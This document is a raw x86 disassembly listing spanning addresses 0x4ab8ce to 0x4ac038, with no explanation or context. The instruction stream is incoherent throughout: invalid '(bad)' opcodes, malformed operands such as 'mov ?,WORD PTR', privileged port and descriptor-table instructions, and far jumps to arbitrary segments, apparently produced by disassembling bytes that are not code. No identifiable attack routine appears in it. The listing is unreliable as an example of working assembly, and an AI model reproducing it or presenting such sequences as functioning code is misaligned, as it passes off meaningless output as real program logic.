  4ab8ce:	push   esp
  4ab8cf:	loop   0x4ab8d4
  4ab8d1:	(bad)  
  4ab8d2:	(bad)  
  4ab8d3:	jno    0x4ab91c
  4ab8d5:	jge    0x4ab87f
  4ab8d7:	add    al,0xa9
  4ab8d9:	pop    esi
  4ab8da:	and    eax,esp
  4ab8dc:	shl    BYTE PTR [edi-0x6c9db0b0],1
  4ab8e2:	xchg   edx,eax
  4ab8e3:	call   0xd5:0x119dba49
  4ab8ea:	pusha  
  4ab8eb:	montmul (bad)
  4ab8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ab8ed:	add    eax,0x2ebaca08
  4ab8f2:	mov    ds,WORD PTR ds:0xba95fea0
  4ab8f8:	std    
  4ab8f9:	ja     0x4ab8ce
  4ab8fb:	mov    eax,0x1d298d41
  4ab900:	out    dx,al
  4ab901:	ror    bl,0x1
  4ab904:	das    
  4ab905:	fs inc ebp
  4ab907:	test   al,0x1d
  4ab909:	adc    al,0x7f
  4ab90b:	push   ss
  4ab90c:	adc    DWORD PTR [esi],0x6bc85e4b
  4ab912:	cmp    ecx,DWORD PTR ds:0xc8180f18
  4ab918:	dec    ebx
  4ab919:	pop    esi
  4ab91a:	enter  0x1fff,0xb
  4ab91e:	and    BYTE PTR [esi],ch
  4ab920:	and    BYTE PTR [eax+ecx*8],cl
  4ab923:	sub    ecx,DWORD PTR [eax]
  4ab925:	mov    al,BYTE PTR [eax+0x40]
  4ab928:	xor    BYTE PTR [esi-0x1c],bl
  4ab92b:	cmp    BYTE PTR [ecx+eax*4+0x2fff603a],0x61
  4ab933:	and    BYTE PTR ds:0xd330012f,0xd3
  4ab93a:	sbb    ebx,DWORD PTR cs:[ebp-0x1f]
  4ab93e:	xor    BYTE PTR [edi],dl
  4ab940:	sbb    DWORD PTR [eax-0x6983f3c4],eax
  4ab946:	mov    al,ds:0xf320c131
  4ab94b:	hlt    
  4ab94c:	mov    bh,0x6f
  4ab94e:	fwait
  4ab94f:	xchg   edx,eax
  4ab950:	pop    es
  4ab951:	lock sub BYTE PTR [eax],ah
  4ab954:	sub    ecx,ebx
  4ab956:	adc    BYTE PTR [eax],0x4f
  4ab959:	ret    
  4ab95a:	xor    eax,0xae0cb92c
  4ab95f:	pandn  mm7,QWORD PTR [ecx]
  4ab962:	jb     0x4ab985
  4ab964:	and    eax,ebx
  4ab966:	fcom   DWORD PTR [esi+0x60a178fd]
  4ab96c:	and    BYTE PTR [edi],ah
  4ab96e:	mov    ecx,0xe581d4df
  4ab973:	sub    bh,BYTE PTR [ebp+0x20]
  4ab976:	add    BYTE PTR [eax-0x53],0xd0
  4ab97a:	and    BYTE PTR [ebx+0x6c],ch
  4ab97d:	xchg   esp,eax
  4ab97e:	and    edi,ebx
  4ab980:	sub    eax,eax
  4ab982:	addr16 popa 
  4ab984:	adc    esi,DWORD PTR [ebp-0x1f4038cc]
  4ab98a:	add    ebx,DWORD PTR [ebp+edi*1-0x7a]
  4ab98e:	jne    0x4ab9c0
  4ab990:	fbstp  TBYTE PTR [esi+0x51]
  4ab993:	jne    0x4ab9ba
  4ab995:	add    DWORD PTR [edx],ebx
  4ab997:	call   0x13c06cad
  4ab99c:	inc    ecx
  4ab99d:	or     eax,0x4e0091d5
  4ab9a2:	dec    ebp
  4ab9a3:	fisubr WORD PTR [eax]
  4ab9a5:	xchg   edi,eax
  4ab9a6:	pop    ecx
  4ab9a7:	lods   eax,DWORD PTR ds:[esi]
  4ab9a8:	test   al,0x2d
  4ab9aa:	mov    bl,0x84
  4ab9ac:	js     0x4ab985
  4ab9ae:	lods   al,BYTE PTR ds:[esi]
  4ab9af:	dec    ebp
  4ab9b0:	jo     0x4ab98c
  4ab9b2:	add    edx,DWORD PTR [esp+edi*1+0x77691c5d]
  4ab9b9:	imul   DWORD PTR [ecx-0x40]
  4ab9bc:	mov    esi,0x3ac4c701
  4ab9c1:	push   eax
  4ab9c2:	cmp    bl,dl
  4ab9c4:	in     al,dx
  4ab9c5:	lea    ecx,[eax+0x572becb6]
  4ab9cb:	ror    esp,cl
  4ab9cd:	mov    ds:0xd0ef1146,al
  4ab9d2:	lea    edi,[esi-0x4f7d1330]
  4ab9d8:	into   
  4ab9d9:	cmp    ebx,DWORD PTR [edi]
  4ab9db:	test   eax,0x170365e1
  4ab9e0:	mov    ds:0xc945f7d0,eax
  4ab9e5:	or     ebp,ebp
  4ab9e7:	je     0x4ab975
  4ab9e9:	sub    eax,DWORD PTR [ebp+0x5c]
  4ab9ec:	add    edi,DWORD PTR [ebx]
  4ab9ee:	pop    ebp
  4ab9ef:	or     BYTE PTR [edx],dh
  4ab9f1:	add    esp,DWORD PTR [esi-0x6cc1a2cc]
  4ab9f7:	mov    esp,0x4047440
  4ab9fc:	jmp    0x4aba41
  4ab9fe:	repnz inc edx
  4aba00:	mov    al,0x17
  4aba02:	mov    edx,0x3c057e67
  4aba07:	sbb    ebp,DWORD PTR [eax-0x24fcfab4]
  4aba0d:	and    dl,BYTE PTR [edx+edx*1]
  4aba10:	cmp    ah,BYTE PTR [esi+eiz*2]
  4aba13:	call   0x62fedba9
  4aba18:	add    al,ch
  4aba1a:	sub    dh,BYTE PTR [ebp+0x43284a0e]
  4aba20:	aad    0xd2
  4aba22:	jns    0x4ab9f2
  4aba24:	sti    
  4aba25:	cmp    eax,0x65f015b1
  4aba2a:	cdq    
  4aba2b:	into   
  4aba2c:	lea    esi,[ecx-0x18]
  4aba2f:	fldenv [eax+0x41]
  4aba32:	add    DWORD PTR [edi],ebp
  4aba34:	xchg   BYTE PTR [edx+0x1f],bh
  4aba37:	adc    al,0xe1
  4aba39:	push   ebx
  4aba3a:	xchg   esi,eax
  4aba3b:	inc    ebp
  4aba3c:	jae    0x4aba5d
  4aba3e:	xor    eax,0x8255d280
  4aba43:	dec    eax
  4aba44:	pop    ds
  4aba45:	je     0x4abaa3
  4aba47:	aam    0xb
  4aba49:	jnp    0x4aba63
  4aba4b:	adc    DWORD PTR [edi+0xb],edi
  4aba4e:	pop    ecx
  4aba4f:	dec    edi
  4aba50:	cmp    BYTE PTR [esi-0x24],bh
  4aba53:	xor    ebx,DWORD PTR [edx+0x513b724a]
  4aba59:	jge    0x4ab9fd
  4aba5b:	lgdtd  ds:0x3952461a
  4aba62:	sbb    DWORD PTR [eax+0x73],esp
  4aba65:	push   ss
  4aba66:	push   ss
  4aba67:	popa   
  4aba68:	mov    al,0x26
  4aba6a:	sti    
  4aba6b:	ja     0x4aba4d
  4aba6d:	out    dx,al
  4aba6e:	sahf   
  4aba6f:	add    eax,0xf2121c44
  4aba74:	js     0x4abaaa
  4aba76:	ss xor al,bh
  4aba79:	or     eax,0x9a068bcf
  4aba7e:	jmp    0x4aba83
  4aba80:	and    eax,0x548c341d
  4aba85:	adc    DWORD PTR [eax+eiz*8],edx
  4aba88:	inc    ebx
  4aba89:	and    al,0x52
  4aba8b:	jle    0x4aba79
  4aba8d:	int3   
  4aba8e:	hlt    
  4aba8f:	xlat   BYTE PTR ds:[ebx]
  4aba90:	or     dh,BYTE PTR [esi+ebp*8]
  4aba93:	cmp    dl,cl
  4aba95:	call   0xe25b18b1
  4aba9a:	mov    eax,ds:0x6f3ea226
  4aba9f:	dec    eax
  4abaa0:	mov    eax,0x3bc15eb4
  4abaa5:	cmp    bh,BYTE PTR [esi+0x3]
  4abaa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4abaa9:	lods   al,BYTE PTR ds:[esi]
  4abaaa:	mov    dl,0x1
  4abaac:	shl    dl,cl
  4abaae:	sar    eax,0xce
  4abab1:	test   BYTE PTR [ecx],ah
  4abab3:	cwde   
  4abab4:	or     BYTE PTR [edi+0x661008d3],0xcc
  4ababb:	jmp    0x4ababe
  4ababd:	add    al,0x3c
  4ababf:	aad    0x4e
  4abac1:	clc    
  4abac2:	mov    bl,0x1b
  4abac4:	in     al,dx
  4abac5:	or     eax,0x60565ba6
  4abaca:	pop    ebx
  4abacb:	sahf   
  4abacc:	add    al,0x54
  4abace:	sbb    BYTE PTR [ecx+ebp*2+0x38],ah
  4abad2:	pop    eax
  4abad3:	daa    
  4abad4:	ins    BYTE PTR es:[edi],dx
  4abad5:	(bad)  
  4abad6:	jle    0x4aba80
  4abad8:	xchg   ecx,eax
  4abad9:	mov    edi,DWORD PTR [esi+ebx*8+0x2b]
  4abadd:	add    eax,ecx
  4abadf:	cmp    eax,0xf73832f1
  4abae4:	and    bl,BYTE PTR ds:0x692d3c8b
  4abaea:	sahf   
  4abaeb:	inc    ebp
  4abaec:	add    DWORD PTR [eax+0x1e],edx
  4abaef:	or     BYTE PTR [edx+0x35b0512f],al
  4abaf5:	mov    ebp,DWORD PTR [ebx]
  4abaf7:	xor    eax,0x31ac101
  4abafc:	fdivr  DWORD PTR [ebx]
  4abafe:	push   eax
  4abaff:	loopne 0x4abac1
  4abb01:	loope  0x4abb02
  4abb03:	inc    ebp
  4abb04:	and    esi,DWORD PTR ds:0x3c738a6
  4abb0a:	nop
  4abb0b:	inc    esp
  4abb0c:	jne    0x4abaae
  4abb0e:	or     cl,BYTE PTR [ebx+0xab50903]
  4abb14:	mov    ds:0x8d52b3de,eax
  4abb19:	push   ss
  4abb1a:	jp     0x4abb3a
  4abb1c:	mov    BYTE PTR [ebx+0x1],dl
  4abb1f:	sbb    eax,0x82bca702
  4abb24:	xlat   BYTE PTR ds:[ebx]
  4abb25:	ss ins BYTE PTR es:[edi],dx
  4abb27:	cmp    edx,0x74
  4abb2a:	and    BYTE PTR [eax+0xd14b88d],al
  4abb30:	or     eax,0x6a4b51b3
  4abb35:	add    al,0xdd
  4abb37:	out    0x36,eax
  4abb39:	jo     0x4abb8b
  4abb3b:	hlt    
  4abb3c:	mov    ecx,eax
  4abb3e:	shl    DWORD PTR [ecx],0x1e
  4abb41:	icebp  
  4abb42:	push   esi
  4abb43:	imul   eax,DWORD PTR [ebp-0x2bd080b3],0xb2842509
  4abb4d:	mov    ?,WORD PTR [edx]
  4abb4f:	mov    al,ds:0x6c3d0efb
  4abb54:	mov    dl,bl
  4abb56:	add    ch,BYTE PTR [edx]
  4abb58:	ror    BYTE PTR [eax+0x77e20148],1
  4abb5e:	arpl   WORD PTR [eiz*4-0x3f8695e0],ax
  4abb65:	sub    DWORD PTR [edi],0x72
  4abb68:	loopne 0x4abba5
  4abb6a:	dec    ebp
  4abb6b:	loopne 0x4abbcb
  4abb6d:	fadd   st,st(0)
  4abb6f:	dec    esi
  4abb70:	mov    BYTE PTR [ebx-0x1],al
  4abb73:	dec    esp
  4abb74:	and    cl,BYTE PTR [esi+ebp*2]
  4abb77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4abb78:	xor    al,0xed
  4abb7a:	inc    eax
  4abb7b:	lea    esi,[ebp-0x2a43b661]
  4abb81:	xchg   ebp,eax
  4abb82:	mov    ds:0xcb20bff3,al
  4abb87:	or     al,0x6
  4abb89:	not    cl
  4abb8b:	cmp    BYTE PTR [ecx],al
  4abb8d:	or     al,0x85
  4abb8f:	fidivr WORD PTR es:[edx+0xe]
  4abb93:	test   BYTE PTR ds:0x20647724,dl
  4abb99:	lea    edx,[eax-0x616af500]
  4abb9f:	xchg   ebp,eax
  4abba0:	push   edx
  4abba1:	(bad)  [ebx+0x41]
  4abba4:	div    DWORD PTR [ebx]
  4abba6:	lods   eax,DWORD PTR ds:[esi]
  4abba7:	scas   eax,DWORD PTR es:[edi]
  4abba8:	mov    ch,bh
  4abbaa:	scas   al,BYTE PTR es:[edi]
  4abbab:	inc    ebx
  4abbac:	rcr    BYTE PTR [ecx+0x52],cl
  4abbaf:	jl     0x4abb35
  4abbb1:	es icebp 
  4abbb3:	arpl   WORD PTR [edx+ebp*2],di
  4abbb6:	inc    edi
  4abbb7:	(bad)  
  4abbb8:	out    0x35,eax
  4abbba:	mov    edi,eax
  4abbbc:	jle    0x4abb40
  4abbbe:	inc    ebx
  4abbbf:	clc    
  4abbc0:	mov    bl,0x88
  4abbc2:	mov    ds:0x640baf85,al
  4abbc7:	xchg   esi,eax
  4abbc8:	push   ds
  4abbc9:	mov    al,0x34
  4abbcb:	cli    
  4abbcc:	xchg   BYTE PTR [ecx],ch
  4abbce:	add    eax,0x17eb940f
  4abbd3:	retf   0x1fc0
  4abbd6:	push   cs
  4abbd7:	xchg   ecx,eax
  4abbd8:	cwde   
  4abbd9:	(bad)  
  4abbda:	in     al,dx
  4abbdb:	adc    BYTE PTR [edi],bl
  4abbdd:	ror    BYTE PTR [ecx+0x20f751a1],0x41
  4abbe4:	test   BYTE PTR [esi+0x724db61c],cl
  4abbea:	xor    BYTE PTR [eax+0x5],cl
  4abbed:	ss retf 0x20c9
  4abbf1:	push   esp
  4abbf2:	push   ebx
  4abbf3:	lahf   
  4abbf4:	retf   0xb4bc
  4abbf7:	sub    esp,eax
  4abbf9:	adc    al,al
  4abbfb:	adc    ecx,DWORD PTR [esi+0x5daa21d8]
  4abc01:	pop    eax
  4abc02:	sbb    BYTE PTR [esi],dh
  4abc04:	pushf  
  4abc05:	retf   0x9032
  4abc08:	mov    cl,0xfb
  4abc0a:	sbb    ch,BYTE PTR [edx-0xe]
  4abc0d:	xchg   esp,eax
  4abc0e:	sub    esi,DWORD PTR [ebp+0x12]
  4abc11:	add    eax,0x47
  4abc14:	mov    cl,0xee
  4abc16:	push   esi
  4abc17:	or     DWORD PTR [ecx],esi
  4abc19:	jge    0x4abc31
  4abc1b:	cmp    al,0x3f
  4abc1d:	mov    dh,BYTE PTR [ecx-0x6a]
  4abc20:	leave  
  4abc21:	xor    al,BYTE PTR [eax-0xff1f5c9]
  4abc27:	scas   eax,DWORD PTR es:[edi]
  4abc28:	ss fwait
  4abc2a:	mov    dl,BYTE PTR [edx]
  4abc2c:	dec    esp
  4abc2d:	mov    BYTE PTR [ebp-0x49],dl
  4abc30:	cmp    dl,0x1c
  4abc33:	jmp    0x1066:0x9a5f0a05
  4abc3a:	sbb    eax,0x49751e6f
  4abc3f:	xor    eax,0x28d210d0
  4abc44:	xor    eax,0x62d02051
  4abc49:	pop    eax
  4abc4a:	arpl   ax,bx
  4abc4c:	or     eax,0x5ea3cdd
  4abc51:	std    
  4abc52:	mov    edx,0xd05401e6
  4abc57:	loopne 0x4abc6b
  4abc59:	adc    esp,ebx
  4abc5b:	imul   edx,DWORD PTR [edx],0x2
  4abc5e:	shl    edx,1
  4abc60:	and    bh,al
  4abc62:	pop    ecx
  4abc63:	sti    
  4abc64:	jo     0x4abcb9
  4abc66:	imul   esp,edx,0x3cbed7e4
  4abc6c:	push   esi
  4abc6d:	fsub   DWORD PTR [eax]
  4abc6f:	call   0x7317:0x729af2a7
  4abc76:	xor    dl,BYTE PTR [edx+eax*8+0x34451a92]
  4abc7d:	dec    ebp
  4abc7e:	in     eax,0x90
  4abc80:	mov    al,ds:0x45554d96
  4abc85:	mov    dl,0x29
  4abc87:	js     0x4abc5c
  4abc89:	push   ecx
  4abc8a:	push   edx
  4abc8b:	push   eax
  4abc8c:	jmp    0x4abc42
  4abc8e:	sbb    cl,BYTE PTR [esi+0x5e]
  4abc91:	add    al,0x73
  4abc93:	imul   ebp,DWORD PTR [esi],0x55104fad
  4abc99:	push   eax
  4abc9a:	dec    esp
  4abc9b:	push   ecx
  4abc9c:	int    0xcd
  4abc9e:	in     eax,dx
  4abc9f:	dec    ebx
  4abca0:	inc    ebx
  4abca1:	pop    esi
  4abca2:	je     0x4abcd3
  4abca4:	or     BYTE PTR [edi+0x74],bl
  4abca7:	sub    bl,BYTE PTR [ebp+0x74]
  4abcaa:	and    eax,0xb49c2d60
  4abcaf:	mov    ebp,0x3873dc74
  4abcb4:	push   esi
  4abcb5:	or     BYTE PTR ds:0xee93200e,cl
  4abcbb:	daa    
  4abcbc:	adc    al,bh
  4abcbe:	add    BYTE PTR [ebx],cl
  4abcc0:	call   0x1c46e8e4
  4abcc5:	rcr    BYTE PTR [eax-0x28],1
  4abcc8:	cmp    BYTE PTR [ebp-0x49],0x60
  4abccc:	pop    ds
  4abccd:	push   ss
  4abcce:	inc    esi
  4abccf:	cmp    DWORD PTR [ebp+0x6],esp
  4abcd2:	addr16 inc edx
  4abcd4:	jmp    0x6803:0x7a121107
  4abcdb:	ficom  WORD PTR [ebx+0x1b83d000]
  4abce1:	xor    eax,0x4b386aff
  4abce6:	lahf   
  4abce7:	or     eax,0x21cc5561
  4abcec:	inc    eax
  4abced:	ss add al,0x57
  4abcf0:	adc    WORD PTR [esi],cx
  4abcf3:	add    DWORD PTR [esi-0x3],esp
  4abcf6:	jp     0x4abd1e
  4abcf8:	push   ebp
  4abcf9:	push   ds
  4abcfa:	jne    0x4abce2
  4abcfc:	cld    
  4abcfd:	jecxz  0x4abd7c
  4abcff:	shl    BYTE PTR [edx-0x77d313ce],cl
  4abd05:	mov    esp,0x5226d00
  4abd0a:	cmp    ebp,DWORD PTR [eax]
  4abd0c:	pop    esp
  4abd0d:	jg     0x4abd67
  4abd0f:	sahf   
  4abd10:	test   al,0xcf
  4abd12:	and    al,0x44
  4abd14:	es cwde 
  4abd16:	pop    ss
  4abd17:	mov    DWORD PTR [eax+edi*4],esp
  4abd1a:	shr    esi,1
  4abd1c:	lods   al,BYTE PTR ds:[esi]
  4abd1d:	mov    al,0x21
  4abd1f:	fdiv   DWORD PTR [ebx+ebp*1-0x6d0499be]
  4abd26:	inc    ebx
  4abd27:	pusha  
  4abd28:	out    dx,al
  4abd29:	or     edi,DWORD PTR [edi-0x40]
  4abd2c:	nop    DWORD PTR [edx]
  4abd2f:	mov    BYTE PTR [edx],0x76
  4abd32:	pop    esi
  4abd33:	fild   DWORD PTR [eax-0x76]
  4abd36:	cmp    al,dh
  4abd38:	add    al,0x69
  4abd3a:	call   esi
  4abd3c:	xchg   ecx,eax
  4abd3d:	enter  0xaa1c,0x2a
  4abd41:	aam    0xd2
  4abd43:	les    ebx,FWORD PTR [edx]
  4abd45:	ss in  al,dx
  4abd47:	mov    ebx,0x15d53a31
  4abd4c:	and    al,0x1
  4abd4e:	sbb    DWORD PTR ds:0xe640fadd,ecx
  4abd54:	test   BYTE PTR [ecx-0x67],al
  4abd57:	or     DWORD PTR [edi+ebp*4+0x55],edx
  4abd5b:	push   0xdaefdf89
  4abd60:	adc    DWORD PTR [esi+0x20e84d8a],ebp
  4abd66:	add    cl,0x69
  4abd69:	or     DWORD PTR [ecx],0x198a63c
  4abd6f:	pop    esi
  4abd70:	cmp    ax,WORD PTR [ecx-0x7a383905]
  4abd77:	cdq    
  4abd78:	(bad)  
  4abd79:	and    ah,dh
  4abd7b:	sbb    DWORD PTR [esp+ecx*8-0x49387378],eax
  4abd82:	xchg   ebx,eax
  4abd83:	stc    
  4abd84:	add    eax,0x8e9eb7e1
  4abd89:	loopne 0x4abdfc
  4abd8b:	dec    eax
  4abd8c:	mov    ah,0x6d
  4abd8e:	mov    al,0x74
  4abd90:	push   esi
  4abd91:	stos   BYTE PTR es:[edi],al
  4abd92:	cmp    BYTE PTR [eax+ecx*2-0x5a474fc6],bl
  4abd99:	add    BYTE PTR [ebx-0x84f02e8],dh
  4abd9f:	jmp    0x8f50:0x48562fa5
  4abda6:	and    DWORD PTR [esi+0x63d0b7c],eax
  4abdac:	sar    BYTE PTR ds:0x1814c710,0x15
  4abdb3:	fistp  DWORD PTR [esi]
  4abdb5:	or     al,0x80
  4abdb7:	mov    edx,0x1cb01c0d
  4abdbc:	int3   
  4abdbd:	cmp    DWORD PTR [edx],ecx
  4abdbf:	daa    
  4abdc0:	or     ah,0x7b
  4abdc3:	jl     0x457ed7c2
  4abdc9:	pusha  
  4abdca:	inc    edx
  4abdcb:	pop    ss
  4abdcc:	push   es
  4abdcd:	rcr    ch,0x89
  4abdd0:	add    cl,cl
  4abdd2:	or     BYTE PTR [ebx-0x19a11743],al
  4abdd8:	sub    al,0x51
  4abdda:	ret    
  4abddb:	jge    0x4abe3b
  4abddd:	jge    0x4abdf5
  4abddf:	add    eax,esp
  4abde1:	xor    al,0x83
  4abde3:	(bad)  
  4abde5:	rol    BYTE PTR [ecx],0x7e
  4abde8:	imul   ecx,DWORD PTR [ebx+0x10a87d4d],0xbe34c4cc
  4abdf2:	or     al,0x19
  4abdf4:	inc    edx
  4abdf5:	pop    ebp
  4abdf6:	cmp    esp,esp
  4abdf8:	adc    BYTE PTR [edx+ecx*8+0x15],ch
  4abdfc:	sub    edx,DWORD PTR [ebp-0x4]
  4abdff:	aad    0x26
  4abe01:	sbb    bh,BYTE PTR [ebx]
  4abe03:	jge    0x4abddd
  4abe05:	jae    0x4abe34
  4abe07:	sbb    BYTE PTR [edi],dl
  4abe09:	sbb    al,0x8d
  4abe0b:	cmc    
  4abe0c:	outs   dx,DWORD PTR ds:[esi]
  4abe0d:	pop    eax
  4abe0e:	(bad)  
  4abe0f:	dec    esi
  4abe10:	and    al,0x3
  4abe12:	mov    DWORD PTR [ecx],edx
  4abe14:	push   ss
  4abe15:	sbb    DWORD PTR [esi+0x218a65a],ebx
  4abe1b:	bound  eax,QWORD PTR fs:[ebx+0x33edc146]
  4abe22:	ror    DWORD PTR [esi],0xcc
  4abe25:	pop    eax
  4abe26:	jb     0x4abdfb
  4abe28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4abe29:	fadd   DWORD PTR [ebx]
  4abe2b:	fcom   st(0)
  4abe2d:	or     al,0x32
  4abe2f:	fadd   QWORD PTR [eax]
  4abe31:	mov    dl,0xa8
  4abe33:	jne    0x4abddc
  4abe35:	add    eax,0x581fe6
  4abe3a:	pop    ss
  4abe3b:	mov    ?,WORD PTR [esi+0x8]
  4abe3e:	sub    esi,DWORD PTR ds:0x17c88a2
  4abe44:	xchg   edx,eax
  4abe45:	rcr    dh,1
  4abe47:	add    eax,0x582e5ce9
  4abe4c:	rcr    BYTE PTR [edx+ecx*2+0x46048cb],cl
  4abe53:	out    dx,eax
  4abe54:	mov    esp,0x40e4bc8
  4abe59:	cmc    
  4abe5a:	dec    eax
  4abe5b:	sbb    BYTE PTR [ebx],bh
  4abe5d:	sbb    BYTE PTR ds:0x2047923e,bh
  4abe63:	sbb    dh,dl
  4abe65:	inc    esp
  4abe66:	dec    edx
  4abe67:	push   esp
  4abe68:	(bad)  
  4abe69:	adc    eax,0xbbd6b30b
  4abe6e:	add    dh,al
  4abe70:	ror    BYTE PTR [eax+0x72f2b745],0xab
  4abe77:	ins    DWORD PTR es:[edi],dx
  4abe78:	jle    0x4abef8
  4abe7a:	and    al,0x18
  4abe7c:	mov    bh,0xd6
  4abe7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4abe7f:	pop    ebx
  4abe80:	ja     0x4abe24
  4abe82:	adc    al,0x80
  4abe84:	std    
  4abe85:	mov    BYTE PTR [ebx],0x5e
  4abe88:	mov    ds,WORD PTR [edx]
  4abe8a:	pop    ecx
  4abe8b:	test   dh,dh
  4abe8d:	pop    es
  4abe8e:	add    al,0x58
  4abe90:	rol    DWORD PTR [edx+0xa],0x6
  4abe94:	adc    ch,BYTE PTR [ebx+0x203c2b40]
  4abe9a:	call   0xb5d2ca27
  4abe9f:	loope  0x4abe7d
  4abea1:	loope  0x4abe34
  4abea3:	sbb    cl,bl
  4abea5:	aam    0x31
  4abea7:	iret   
  4abea8:	jae    0x4abef9
  4abeaa:	push   eax
  4abeab:	stos   DWORD PTR es:[edi],eax
  4abeac:	daa    
  4abead:	add    DWORD PTR [ecx+0x16fbc611],ebp
  4abeb3:	hlt    
  4abeb4:	adc    eax,0xdff7ec0e
  4abeb9:	sbb    edi,edi
  4abebb:	xchg   ebx,eax
  4abebc:	pop    edx
  4abebd:	ds cmp esp,edi
  4abec0:	xchg   BYTE PTR [esi],bl
  4abec2:	and    edi,0x3
  4abec5:	inc    edi
  4abec6:	add    edx,edi
  4abec8:	push   ecx
  4abec9:	sub    al,0xec
  4abecb:	mov    ch,BYTE PTR [edi-0x2f]
  4abece:	dec    ebx
  4abecf:	sbb    DWORD PTR [esi+0x33],eax
  4abed2:	add    ebp,DWORD PTR [eax+edx*8+0x6c24102]
  4abed9:	xor    eax,ebx
  4abedb:	mov    BYTE PTR [eax+0x6d],dl
  4abede:	rcr    DWORD PTR [eax+0x72],0xb7
  4abee2:	sbb    bl,BYTE PTR [esp+eax*4+0x6ec01624]
  4abee9:	in     al,dx
  4abeea:	xchg   esp,eax
  4abeeb:	popa   
  4abeec:	and    BYTE PTR [eax+0xf],bh
  4abeef:	jo     0x4abed3
  4abef1:	ja     0x4abf0c
  4abef3:	and    al,0xb8
  4abef5:	xchg   esp,eax
  4abef6:	imul   eax,DWORD PTR [edx-0x61],0x6169de8
  4abefd:	cmp    al,0xba
  4abeff:	sti    
  4abf00:	inc    eax
  4abf01:	sub    edi,eax
  4abf03:	or     esp,eax
  4abf05:	inc    eax
  4abf06:	inc    esp
  4abf07:	add    esi,DWORD PTR [ebp+0x7]
  4abf0a:	nop
  4abf0b:	dec    esp
  4abf0c:	shl    BYTE PTR ds:0x9a29a819,1
  4abf12:	adc    ch,BYTE PTR [ebx+0x5a]
  4abf15:	imul   edx,eax,0x5a
  4abf18:	push   ebp
  4abf19:	test   BYTE PTR [esi+0x36],dh
  4abf1c:	inc    ebx
  4abf1d:	ret    0x20d6
  4abf20:	inc    ecx
  4abf21:	jbe    0x4abee6
  4abf23:	add    ecx,DWORD PTR [eax+0x4039dc54]
  4abf29:	test   BYTE PTR [ebp*8+0x32bf75c3],al
  4abf30:	fimul  DWORD PTR [esi]
  4abf32:	sub    BYTE PTR [ebx],0x60
  4abf35:	pop    es
  4abf36:	add    eax,0x8b23440e
  4abf3b:	iret   
  4abf3c:	fimul  DWORD PTR [edx+0x21]
  4abf3f:	loope  0x4abf4f
  4abf41:	mov    edx,DWORD PTR [esi+0x2d]
  4abf44:	and    dh,BYTE PTR [eax+0x70180788]
  4abf4a:	fimul  DWORD PTR [edi+0x42]
  4abf4d:	call   0xfaa7f8d2
  4abf52:	inc    edx
  4abf53:	or     BYTE PTR [esi+eiz*4-0x36e1d4b1],al
  4abf5a:	fadd   st,st(6)
  4abf5c:	push   edi
  4abf5d:	or     eax,esp
  4abf5f:	dec    esi
  4abf60:	add    ecx,ecx
  4abf62:	jne    0x4abf83
  4abf64:	and    al,0xde
  4abf66:	add    DWORD PTR [eax],esi
  4abf68:	stos   BYTE PTR es:[edi],al
  4abf69:	pop    ebx
  4abf6a:	call   0x2b33:0x2983ddd0
  4abf71:	xor    dh,BYTE PTR [eax-0x2dfdea80]
  4abf77:	arpl   WORD PTR [ebp-0x74e814c3],di
  4abf7d:	mov    dh,0xf0
  4abf7f:	sbb    BYTE PTR [eax+0x284c4e09],dl
  4abf85:	mov    WORD PTR [esi],?
  4abf87:	xchg   BYTE PTR [edx],al
  4abf89:	iret   
  4abf8a:	shr    BYTE PTR [esi],0xbf
  4abf8d:	out    dx,eax
  4abf8e:	iret   
  4abf8f:	add    al,cl
  4abf91:	sbb    eax,0x63884604
  4abf96:	or     eax,0x1c750126
  4abf9b:	dec    ebx
  4abf9c:	sbb    DWORD PTR [ebx+0x4804172b],edx
  4abfa2:	(bad)  
  4abfa3:	(bad)  
  4abfa4:	pushf  
  4abfa5:	in     al,dx
  4abfa6:	ins    DWORD PTR es:[edi],dx
  4abfa7:	add    al,0x4a
  4abfa9:	sbb    eax,DWORD PTR [esp+ecx*2]
  4abfac:	adc    BYTE PTR [ecx+0x2d],bh
  4abfaf:	push   ebx
  4abfb0:	pop    esp
  4abfb1:	pop    ebx
  4abfb2:	js     0x4abfbb
  4abfb4:	in     eax,0x5a
  4abfb6:	add    eax,0xd020d05c
  4abfbb:	daa    
  4abfbc:	ins    BYTE PTR es:[edi],dx
  4abfbd:	or     al,0x8
  4abfbf:	xchg   BYTE PTR [eax+0x20],dh
  4abfc2:	mov    dh,0xd5
  4abfc4:	adc    al,0x4
  4abfc6:	fadd   QWORD PTR ds:0xadd0e803
  4abfcc:	fild   WORD PTR [ebp-0xa]
  4abfcf:	inc    ebx
  4abfd0:	sub    cl,BYTE PTR [ebx+0x28]
  4abfd3:	sti    
  4abfd4:	(bad)  
  4abfd5:	and    bl,dh
  4abfd7:	mov    dl,BYTE PTR [ecx]
  4abfd9:	aad    0xee
  4abfdb:	(bad)  
  4abfdc:	sbb    al,0x96
  4abfde:	outs   dx,BYTE PTR ds:[esi]
  4abfdf:	pop    ds
  4abfe0:	inc    ecx
  4abfe1:	dec    DWORD PTR [ecx+0x9]
  4abfe4:	adc    dl,al
  4abfe6:	sub    al,0x34
  4abfe8:	lea    edx,[eax-0x3c]
  4abfeb:	inc    eax
  4abfec:	inc    DWORD PTR [ebx+esi*2+0x8]
  4abff0:	or     DWORD PTR [ebx-0x3f7e0383],ebx
  4abff6:	shl    BYTE PTR [eax],1
  4abff8:	sbb    ebp,esp
  4abffa:	iret   
  4abffb:	adc    BYTE PTR [ebp-0x50],dl
  4abffe:	shl    DWORD PTR [esi],0xe8
  4ac001:	mov    ah,BYTE PTR [edx+0x374f557e]
  4ac007:	push   esp
  4ac008:	in     al,0x4c
  4ac00a:	mov    cs,WORD PTR [ebx]
  4ac00c:	inc    ebp
  4ac00d:	cwde   
  4ac00e:	mov    edi,0xa46175ac
  4ac013:	imul   ebp,DWORD PTR [edi+0x2c7dd532],0xffffff82
  4ac01a:	aam    0x56
  4ac01c:	add    DWORD PTR [edi+0x1],0x67a06013
  4ac023:	je     0x4ac033
  4ac025:	call   0x6a3befc3
  4ac02a:	push   ecx
  4ac02b:	fsubr  DWORD PTR [esi]
  4ac02d:	dec    edx
  4ac02e:	mov    ch,BYTE PTR [eax+0xc457022]
  4ac034:	or     al,0xc
  4ac036:	or     dl,bh
  4ac038:	js     0x4ac01a
